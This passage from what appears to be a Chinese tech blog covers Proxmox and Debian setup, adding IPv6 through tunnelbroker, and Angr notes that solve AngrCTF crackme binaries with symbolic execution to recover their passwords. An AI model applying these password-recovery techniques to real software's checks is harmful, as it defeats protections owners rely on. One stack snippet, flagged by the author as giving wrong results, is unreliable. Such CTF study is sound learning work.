abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">UUID</span><span class="hljs-operator">=</span>**** /data ntfs3<br></code></pre></td></tr></table></figure><h4 id="Debian取消休眠"><a href="#Debian取消休眠" class="headerlink" title="Debian取消休眠"></a>Debian取消休眠</h4><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs fortran">查看状态<br>systemctl <span class="hljs-keyword">status</span> sleep.<span class="hljs-keyword">target</span><br>关闭休眠<br>systemctl mask sleep.<span class="hljs-keyword">target</span> suspend.<span class="hljs-keyword">target</span> hibernate.<span class="hljs-keyword">target</span> hybrid-sleep.<span class="hljs-keyword">target</span><br>查看状态<br>systemctl <span class="hljs-keyword">status</span> sleep.<span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><h4 id="Proxmox权限管理"><a href="#Proxmox权限管理" class="headerlink" title="Proxmox权限管理"></a>Proxmox权限管理</h4><p>​由于Proxmox默认是系统root用户登录，可能会存在某些安全隐患，因此这里可以设置普通用户身份。</p><ul><li><p>创建用户组，在数据中心–权限–群组，可以创建用户组</p><p><img src="https://img-blog.csdnimg.cn/direct/34d45fa69701473b814aa8ddf22072d2.png" alt="image-20231217195938622"></p></li><li><p>给用户组分配权限，在数据中心–权限，可以添加用户组权限，路由选择<code>/</code>，角色选择<code>Administrator</code>。</p><p><img src="https://img-blog.csdnimg.cn/direct/f3671caf5f7942f284c4b16a22e4104b.png" alt="image-20231217195958998"></p></li><li><p>在数据中心–权限–用户可以添加新用户，其中领域<code>Proxmox VE authentication server</code>表示使用<code>Porxmox</code>内置用户管理，与Linux登录用户不是同一类型用户，可以重命；<code>Linux PAM standard authentication</code>表示使用LInux内置用户管理，实际上与Linux登录系统使用的同一套，此处用户即为LInux系统用户，root用户就是此种类型。群组选择上面创建好的群组</p></li><li><p>创建好用户后，在数据中心–权限–用户–root，禁用root用户，把已启用的复选框去掉即可。</p><p><img src="https://img-blog.csdnimg.cn/direct/8f3b1d4f25b44e93be23668d42bca360.png" alt="image-20231217200137454"></p></li></ul><blockquote><p>有些选项可能必须使用root用户才能更改，因此我们可以使用<code>sudo pveum usermod root@pam -enable 1</code>启用root用户，密码即为Linux系统root密码，<strong>记得用完再将root用户禁用回去。</strong></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>52折腾</category>
      
      <category>ProxmoxVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>ProxmoxVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>为云服务器免费添加ipv6支持</title>
    <link href="/2023/04/08/misc/%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%8D%E8%B4%B9%E6%B7%BB%E5%8A%A0ipv6%E6%94%AF%E6%8C%81/"/>
    <url>/2023/04/08/misc/%E4%B8%BA%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%8D%E8%B4%B9%E6%B7%BB%E5%8A%A0ipv6%E6%94%AF%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="为云服务器免费添加ipv6支持"><a href="#为云服务器免费添加ipv6支持" class="headerlink" title="为云服务器免费添加ipv6支持"></a>为云服务器免费添加ipv6支持</h2><p>​随着ipv6的推广，许多应用也在逐步支持ipv6，本人之前又有一台云服务器，但是仅拥有ipv4地址，想要开启ipv6地址，好像还要重新购买ipv6流量包，因此才有了今天的文章，<strong>用<code>tunnelbroker</code>为云服务器免费添加ipv6支持</strong>。</p><h3 id="主要原理"><a href="#主要原理" class="headerlink" title="主要原理"></a>主要原理</h3><p>​<code>tunnelbroker</code>的主要原理就是搭建一个云服务器和<code>tunnelbroker</code>的通信隧道，所有指向某一ipv6地址的流量都将通过<code>tunnelbroker</code>转发到自己的云服务器上，因此这种方式添加ipv6支持势必会增加ipv6访问的延迟，如果有对延迟特殊需求的小伙伴还是选择原始ipv6吧，如果跟我一下仅仅用作下载器，请继续阅读。</p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><ul><li>到 <a href="https://tunnelbroker.net/">https://tunnelbroker.net/</a> 网站申请一个tunnel，创建Tunnel</li></ul><p>​IPv4 Endpoint 需要些服务器的公网IP地址，<code>tunnelbroker</code>首先需要访问到你的服务器才能进行下一步操作。</p><p>地区可以选择离服务器最近的ip，当然是为了减少延迟，这里我选择的是日本的ip</p><p><img src="https://img-blog.csdnimg.cn/direct/77876de2249d47da90719afd1f66e039.png" alt="image-20230408135754692"></p><p>值得注意的是，云服务器需要能够被ping同，否则<code>tunnelbroker</code>会报错，将<code>66.220.2.74</code>加入白名单就行</p><p><img src="https://img-blog.csdnimg.cn/direct/6f74d187cbc141428487310923ac6ca5.png" alt="image-20230408140234999"></p><ul><li>创建完成后，点击“Example Configurations”，点击“Linux-route2”，将自动生成对应的ipv6地址命令，将该命令复制到linux服务器上执行即可，注意将红框中的ip地址更改为服务器的内网地址，不是之前的公网地址。</li></ul><p><img src="https://img-blog.csdnimg.cn/direct/01bdada88f034a2bb8618eee9ffc51fd.png" alt="image-20230408140901197"></p><ul><li>使用以下命令测试ipv6是都通畅，能ping通就没问题。</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">ping6 <span class="hljs-keyword">he</span>.<span class="hljs-keyword">net</span><br></code></pre></td></tr></table></figure><p>如果没ping通的话，原因可能有很多，这个就只能靠大家自己探索了。</p>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>52折腾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Angr 学习笔记</title>
    <link href="/2023/03/15/Learn/Angr%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/03/15/Learn/Angr%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Angr学习笔记"><a href="#Angr学习笔记" class="headerlink" title="Angr学习笔记"></a>Angr学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录一下Angr的基本使用方法，主要是基于<code>Github</code>上的开源项目以及笔记<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM">AngrCTF_FITM</a>整理，<code>Angr</code>在逆向方面确实用处比较大，特此记录一下。</p><h2 id="什么是Angr"><a href="#什么是Angr" class="headerlink" title="什么是Angr"></a>什么是Angr</h2><p>angr是一个用于分析二进制文件的python框架。它专注于静态和符号分析，使其适用于各种任务。项目地址：<a href="https://github.com/angr">https://github.com/angr</a></p><h2 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h2><p>​符号执行就是在运行程序时，用符号来替代真实值。符号执行相较于真实值执行的优点在于，当使用真实值执行程序时，我们能够遍历的程序路径只有一条, 而使用符号进行执行时，由于符号是可变的，我们就可以利用这一特性，尽可能的将程序的每一条路径遍历，这样的话，必定存在至少一条能够输出正确结果的分支, 每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果。</p><p>​个人理解为Angr就是将输入作为一种可变符号，各种条件分支作为路径分支，符号执行实际上就是在走迷宫，最终得到到达终点的正确路径。</p><h2 id="0x00-一般模板"><a href="#0x00-一般模板" class="headerlink" title="0x00 一般模板"></a>0x00 一般模板</h2><p>题目：<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master/00_angr_find">00_angr_find</a></p><p>直接拖到ida中查看源码：</p><p><img src="https://img-blog.csdnimg.cn/7137a0fd1cfe4b829961fbc1513a3d3c.png" alt="image-20230315100537072"></p><p>主要逻辑就是对于输入的字符串进行<code>complex_function</code>变换然后比较。</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs pf">import angr<br>import sys<br><br><br>def Run():<br>    bin_path = <span class="hljs-string">&quot;./00_angr_find&quot;</span><br>    project = angr.Project(bin_path, auto_load_libs=False)<br>    initial_state = project.factory.entry_state()<br>    simulation = project.factory.simgr(initial_state)<br>    <br>    def is_successful(<span class="hljs-keyword">state</span>):<br>        stdout_output = <span class="hljs-keyword">state</span>.posix.dumps(sys.stdout.fileno())<br>        if b&#x27;Good Job.&#x27; <span class="hljs-keyword">in</span> stdout_output:<br>            return True<br>        else:<br>            return False<br><br>    def should_abort(<span class="hljs-keyword">state</span>):<br>        stdout_output = <span class="hljs-keyword">state</span>.posix.dumps(sys.stdout.fileno())<br>        if b&#x27;Try again.&#x27; <span class="hljs-keyword">in</span> stdout_output:<br>            return True<br>        else:<br>            return False<br>    <br>    simulation.explore(find=is_successful, avoid=should_abort)<br>    <br>    if simulation.found:<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">state</span> <span class="hljs-keyword">in</span> simulation.found:<br>            solution = <span class="hljs-keyword">state</span>.posix.dumps(sys.stdin.fileno())<br>            <span class="hljs-comment"># solution0 = state.solver.eval(passwd0,cast_to=bytes)</span><br>            <span class="hljs-comment"># solution1 = state.solver.eval(passwd1,cast_to=bytes)</span><br>            <span class="hljs-comment"># solution = solution0+b&quot; &quot;+solution1</span><br>            print(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.format(solution.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)))<br>    else:<br>        raise Exception(&#x27;Could not find the solution&#x27;)<br><br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Run()<br></code></pre></td></tr></table></figure><ul><li><p><code>project = angr.Project(bin_path, auto_load_libs=False)</code></p><p>Angr使用<code>Project</code>作为二进制文件的基本映像，<code>auto_load_libs=False</code>避免程序导入不必要的库，否则分析到库函数调用时也会进入库函数，这样会增加分析的工作量，也有可能会跑挂。</p></li><li><p><code>initial_state = project.factory.entry_state()</code></p><p>Angr并不是真正的运行程序，而是模拟程序的运行路径，因此Angr提供<code>state</code>来记录程序模拟时的状态（记录一系列程序运行时的信息，如内存&#x2F;寄存器&#x2F;文件等，类似于快照），<code>project.factory.entry_state</code>用于提供程序初始化状态。</p></li><li><p><code> simulation = project.factory.simgr(initial_state)</code></p><p>基于状态创建程序模拟管理器<code>simulation</code>，用于控制程序的模拟执行，从我们提供的初始化状态<code>initial_state</code>开始。</p></li><li><p><code>simulation.explore(find=is_successful, avoid=should_abort)</code></p><p>符号执行最普遍的操作时找到能够到达某个地址的状态，<code>simulation</code>提供了&#96;&#96;explore()<code>方法寻找路径，启动后程序会一直执行，直到发现了一个和</code>find<code>参数指定的条件相匹配的状态。</code>其中<code>find</code>和<code>avoid</code>参数可以为;</p><ul><li>具体地址</li><li>具体地址的列表集合</li><li>以<code>state</code>为参数的判断函数（本题解中就是用的这种方式）</li></ul></li><li><p><code>sys.*.fileno()</code></p><ul><li><code>sys.stdin.fileno()</code>标准输入文件描述符，值为<code>0</code>；</li><li><code>sys.stdout.fileno()</code>标准输出文件描述符，值为<code>1</code>；</li><li><code>sys.stderr.fileno()</code>标准错误文件描述符，值为<code>2</code>。</li></ul></li><li><p><code>state.posix.dumps</code></p><p><code>state.posix.dumps(0)</code>代表该状态程序的所有输入，<code>state.posix.dumps(1)</code>代表该状态程序的所有输出。</p></li></ul><h2 id="0x01-输入的参数存放在寄存器中"><a href="#0x01-输入的参数存放在寄存器中" class="headerlink" title="0x01 输入的参数存放在寄存器中"></a>0x01 输入的参数存放在寄存器中</h2><p>题目：<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master/03_angr_symbolic_registers">03_angr_symbolic_registers</a></p><p>日常IDA查看一下主函数：</p><p><img src="https://img-blog.csdnimg.cn/f17bf5a89f9c48ba928f89469bd6ecdc.png" alt="image-20230314140123976"></p><p>程序通过<code>get_user_input</code>读取输入，并存放至<code>eax</code>、<code>ebx</code>、<code>edx</code>，当然我们可以使用上一题那样直接进行路径搜索，但是angr在处理复杂格式的字符串输入时优化不是很好，最好的办法是绕过<code>scanf</code>函数，直接将符号注入到寄存器中。</p><p><img src="https://img-blog.csdnimg.cn/ceba4be23da4408c8f9e047c6aac217c.png" alt="image-20230314140314978"></p><p><code>complex_function_1</code>、<code>complex_function_2</code>、<code>complex_function_3</code>密码加密函数，也是我们用于路径寻找的点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">输入的参数存放在寄存器中<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Run</span>():<br>    bin_path = <span class="hljs-string">&quot;./03_angr_symbolic_registers&quot;</span><br>    project = angr.Project(bin_path, auto_load_libs=<span class="hljs-literal">False</span>)<br>    <span class="hljs-comment"># initial_state = project.factory.entry_state()</span><br>    start_address = <span class="hljs-number">0x08048980</span><br>    initial_state = project.factory.blank_state(addr=start_address)<br>    <br>    passwd_size_in_bits =<span class="hljs-number">32</span><br>    passwd0 = claripy.BVS(<span class="hljs-string">&#x27;passwd0&#x27;</span>,passwd_size_in_bits)<br>    passwd1 = claripy.BVS(<span class="hljs-string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)<br>    passwd2 = claripy.BVS(<span class="hljs-string">&#x27;passwd2&#x27;</span>, passwd_size_in_bits)<br><br>    initial_state.regs.eax = passwd0<br>    initial_state.regs.ebx = passwd1<br>    initial_state.regs.edx = passwd2<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> simulation.found:<br>            solution_state = i<br>            solution0 = <span class="hljs-built_in">format</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(passwd0), <span class="hljs-string">&#x27;x&#x27;</span>)<br>            solution1 = <span class="hljs-built_in">format</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(passwd1), <span class="hljs-string">&#x27;x&#x27;</span>)<br>            solution2 = <span class="hljs-built_in">format</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(passwd2), <span class="hljs-string">&#x27;x&#x27;</span>)<br>            solution = solution0 + <span class="hljs-string">&quot; &quot;</span> + solution1 + <span class="hljs-string">&quot; &quot;</span> + solution2<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Run()<br></code></pre></td></tr></table></figure><ul><li><p>为了绕过<code>get_user_input</code>输入函数，我们不能从<code>main</code>函数的开头开始，通过使用<code>start_address</code>定位到<code>get_user_input</code>下一条指令，即<code>0x08048980</code>，在此处构造程序状态。</p></li><li><p><code>project.factory.blank_state</code></p><p>当我们不使用main函数作为程序入口时，初始化状态就不能够使用<code>entry_state()</code>，好在<code>project.factory</code>提供了其他的函数初始化状态：</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><code>entry_state()</code></td><td>构造一个从函数入口点执行的已初始化状态</td></tr><tr><td><code>blank_state()</code></td><td>在指定的入口地址处构造一个“空状态”，该的数据都是未初始化的，当使用未初始化的的数据时，一个不受约束的符号值将会被返回。</td></tr><tr><td><code>call_state()</code></td><td>构造一个已经准备好执行某个函数的状态</td></tr><tr><td><code>full_init_state()</code></td><td>构造一个已经执行过所有与需要执行的初始化函数，并准备从函数入口点执行的状态。比如，共享库构造函数（constructor）或预初始化器。当这些执行完之后，程序将会跳到入口点。</td></tr></tbody></table></li><li><p><code>    passwd0 = claripy.BVS(&#39;passwd0&#39;,passwd_size_in_bits)</code></p><p>构造了一个名为<code>passwd0</code>的符号位变量，符号位向量是angr用于将符号值注入程序的数据类型。这些将是angr将解决的方程式的“x”，也就是约束求解时的自变量。可以通过 <code>BVV(value,size)</code> 和 <code>BVS( name, size)</code> 接口创建位向量，也可以用<code> FPV</code> 和 <code>FPS</code> 来创建浮点值和符号。</p></li><li><p><code> initial_state.regs.eax = passwd0</code></p><p>将符号变量<code>passwd0</code>注入<code>eax</code>寄存器中。</p></li><li><p><code>solution_state.solver.eval(passwd0)</code></p><p>返回的是<code>passwd0</code>的一个十进制解，用<code>format</code>将其16进制化。这里：</p><ul><li><code>solver.eval(expression)</code>：将会解出<code>expression</code>一个可行解。</li><li><code>solver.eval_one(expression)</code>：将会给出<code>expression</code>的可行解，若有多个可行解，则抛出异常。</li><li><code>solver.eval_upto(expression, n)</code>：将会给出最多n个可行解，如果不足n个就给出所有的可行解。</li><li><code>solver.eval_exact(expression, n)</code>：将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</li><li><code>solver.min(expression)</code>：将会给出最小可行解。</li><li><code>solver.max(expression)</code>：将会给出最大可行解。</li></ul><p><strong>solution_state.solver.eval与state.posix.dumps的区别：</strong></p><p><code>state.posix.dumps</code>一般在未定义<code>BVS</code>时打印我们想要的结果，而<code>solution_state.solver.eval</code>一般用于定义了<code>BVS</code>，打印<code>BVS</code>的结果。</p></li></ul><h2 id="0x02-输入参数存放在栈上"><a href="#0x02-输入参数存放在栈上" class="headerlink" title="0x02 输入参数存放在栈上"></a>0x02 输入参数存放在栈上</h2><p>题目：<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master/04_angr_symbolic_stack">04_angr_symbolic_stack</a></p><p>直接拖进IDA进行分析，可以看的<code>handle_user</code>为主逻辑，并且<code>scanf</code>读取的数据是直接写在栈上的，那么我们注入寄存器的方法就是失效了，现在尝试直接注入栈空间。</p><p><img src="https://img-blog.csdnimg.cn/b1336869d0e9471f82946a74953bfed5.png" alt="image-20230315153909020"></p><p>同样设置初始化状态为<code>scanf</code>之后，即<code>0x08048697</code>，这里有小伙伴可能会有疑问了，<code>scanf</code>后面明明是<code>0x08048694</code>为什么是要使用下一条指令呢，原因是<code>add esp,10h</code>是在清理<code>scanf</code>的栈帧，可能会对我们的<code>esp</code>造成影响，因此我们这里直接跳过了<code>scanf</code>栈帧的清理，否则还需要对<code>esp</code>进行相应的处理。</p><p><img src="https://img-blog.csdnimg.cn/6c0faf93e14f4a4aafdd3004b82d0f2c.png" alt="image-20230315192238892"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Run</span>():<br>    bin_path = <span class="hljs-string">&quot;./04_angr_symbolic_stack&quot;</span><br>    project = angr.Project(bin_path, auto_load_libs=<span class="hljs-literal">False</span>)<br>    <span class="hljs-comment"># initial_state = project.factory.entry_state()</span><br>    start_address = <span class="hljs-number">0x08048697</span><br>    initial_state = project.factory.blank_state(addr=start_address)<br><br>    initial_state.regs.ebp = initial_state.regs.esp<br><br>    passwd_size_in_bits = <span class="hljs-number">32</span><br>    passwd0 = claripy.BVS(<span class="hljs-string">&#x27;passwd0&#x27;</span>, passwd_size_in_bits)<br>    passwd1 = claripy.BVS(<span class="hljs-string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)<br><br>    <span class="hljs-comment"># 构造主函数栈帧</span><br>    padding_length_in_bytes = <span class="hljs-number">0x8</span><br>    initial_state.regs.esp -= padding_length_in_bytes<br>    initial_state.stack_push(passwd0)<br>    initial_state.stack_push(passwd1)<br><br>    simulation = project.factory.simgr(initial_state)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        solution0 = <span class="hljs-built_in">format</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(passwd0), <span class="hljs-string">&#x27;d&#x27;</span>)<br>        solution1 = <span class="hljs-built_in">format</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(passwd1), <span class="hljs-string">&#x27;d&#x27;</span>)<br>        solution = solution0 + <span class="hljs-string">&quot; &quot;</span> + solution1<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Success! Solution is: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(solution))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Run()<br></code></pre></td></tr></table></figure><ul><li><p><code>initial_state.regs.ebp = initial_state.regs.esp</code></p><p>由于我们使用的是<code>project.factory.blank_state</code>初始化的状态，该状态内的数据都是未初始化的，并且后面执行的代码使用到了栈上的数据，因此我们需要手动构建当前状态的栈帧。</p></li><li><p><code>initial_state.regs.esp -= padding_length_in_bytes</code></p><p>  通过汇编代码我们可以得知：求解的<code>passwd0</code>和<code>passwd1</code>分别位于栈上<code>ebp-0xc</code>和<code>ebp-0x10</code>位置，也就是说栈上有8个字节是被占用的，我们需要手动填充这些字节，然后将符号入变量入栈，保证汇编代码的正确性。另一种不用压栈的方法就是直接将<code>esp</code>移动至相应位置，直接向该地址写入符号位变量，但是下面的解法<strong>是有问题，最终输出的结果不对</strong>，我也不清楚那里的问题，望大佬告知。</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">initial_state<span class="hljs-selector-class">.regs</span><span class="hljs-selector-class">.rbp</span> = initial_state<span class="hljs-selector-class">.regs</span><span class="hljs-selector-class">.rsp</span><br>passwd0_addr = initial_state<span class="hljs-selector-class">.regs</span><span class="hljs-selector-class">.esp</span> - <span class="hljs-number">0</span>xc<br>passwd1_addr = initial_state<span class="hljs-selector-class">.regs</span><span class="hljs-selector-class">.esp</span> - <span class="hljs-number">0</span>x10<br>initial_state<span class="hljs-selector-class">.regs</span><span class="hljs-selector-class">.esp</span> -= <span class="hljs-number">0</span>x10<br>initial_state<span class="hljs-selector-class">.memory</span><span class="hljs-selector-class">.store</span>(passwd0_addr, passwd0)<br>initial_state<span class="hljs-selector-class">.memory</span><span class="hljs-selector-class">.store</span>(passwd1_addr, passwd1)<br></code></pre></td></tr></table></figure></li></ul><h2 id="0x03-传入的参数存在全局变量区"><a href="#0x03-传入的参数存在全局变量区" class="headerlink" title="0x03 传入的参数存在全局变量区"></a>0x03 传入的参数存在全局变量区</h2><p>题目：<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM/tree/master/05_angr_symbolic_memory">05_angr_symbolic_memory</a></p><p>主函数：</p><p><img src="https://img-blog.csdnimg.cn/786fe0cf8e954c37adba8e47d3786ccc.png" alt="image-20230315200647631"></p><p>这道题目解法与之前的类似，主要区别在于<code>scanf</code>输入的内容存储在<code>.bss</code>段，而<code>.bss</code>段默认是程序启动时，由系统自动分配的空间，因此如果我们想要跳过<code>scanf</code>时，就必须要将符号位变量写入至<code>.bss</code>段的相应位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 